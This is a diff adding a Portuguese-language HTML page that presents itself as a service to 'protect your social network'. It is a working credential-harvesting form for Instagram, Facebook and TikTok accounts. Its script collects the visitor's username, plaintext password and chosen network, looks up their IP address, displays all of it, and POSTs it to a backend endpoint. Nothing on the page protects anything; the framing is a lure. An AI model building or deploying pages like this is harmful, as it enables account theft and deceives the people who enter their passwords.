@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Proteja sua rede social!</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <style>
+        body {
+            background-color: #f8f9fa; /* Cor de fundo do corpo */
+            font-family: Arial, sans-serif;
+        }
+
+        h1 {
+            color: #007BFF; /* Cor do título */
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        form {
+            background-color: #FFFFFF; /* Cor de fundo do formulário */
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Sombra */
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #343A40; /* Cor dos rótulos */
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .social-media-label {
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        button {
+            background-color: #28A745; /* Cor de fundo do botão */
+            color: #FFFFFF; /* Cor do texto do botão */
+            padding: 15px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #218838; /* Cor de fundo do botão ao passar o mouse */
+        }
+
+        #info {
+            margin-top: 20px;
+            color: #343A40; /* Cor do texto de informações */
+            text-align: center;
+        }
+    </style>
+  <script>
+    function submitForm() {
+    const user = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const socialMedia = document.querySelector('input[name="social_media"]:checked').value;
+
+    // Obter o IP do usuário
+    fetch('/get_location')
+        .then(response => response.json())
+        .then(data => {
+            const user_ip = data.ip;
+
+            // Exibir informações na tela
+            const infoDiv = document.getElementById('info');
+            infoDiv.innerHTML = `
+                <p>IP: ${user_ip}</p>
+                <p>User: ${user}</p>
+                <p>Password: ${password}</p>
+                <p>Rede Social: ${socialMedia}</p>
+            `;
+
+            // Enviar as informações para o servidor Flask
+            fetch('/submit_info', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    ip: user_ip,
+                    user: user,
+                    password: password,
+                    socialMedia: socialMedia
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Exibir a resposta do servidor no console
+                console.log(data);
+            })
+            .catch(error => console.error('Erro:', error));
+        })
+        .catch(error => console.error('Erro:', error));
+}
+    </script>
+</head>
+<body>
+    <h1>Proteja sua rede social!</h1>
+    <form id="loginForm">
+        <label for="username">Usuário (Gmail, número de telefone ou nome de usuário):</label>
+        <input type="text" id="username" name="username">
+
+        <label for="password">Senha:</label>
+        <input type="password" id="password" name="password">
+
+        <label class="social-media-label">Escolha a rede social:</label>
+        <div class="form-check">
+            <input type="radio" id="instagram" class="form-check-input" name="social_media" value="instagram">
+            <label class="form-check-label" for="instagram">Instagram</label>
+        </div>
+        <div class="form-check">
+            <input type="radio" id="facebook" class="form-check-input" name="social_media" value="facebook">
+            <label class="form-check-label" for="facebook">Facebook</label>
+        </div>
+        <div class="form-check">
+            <input type="radio" id="tiktok" class="form-check-input" name="social_media" value="tiktok">
+            <label class="form-check-label" for="tiktok">TikTok</label>
+        </div>
+
+        <button type="button" onclick="submitForm()">Entrar</button>
+    </form>
+
+    <div id="info"></div>
+</body>
+</html>
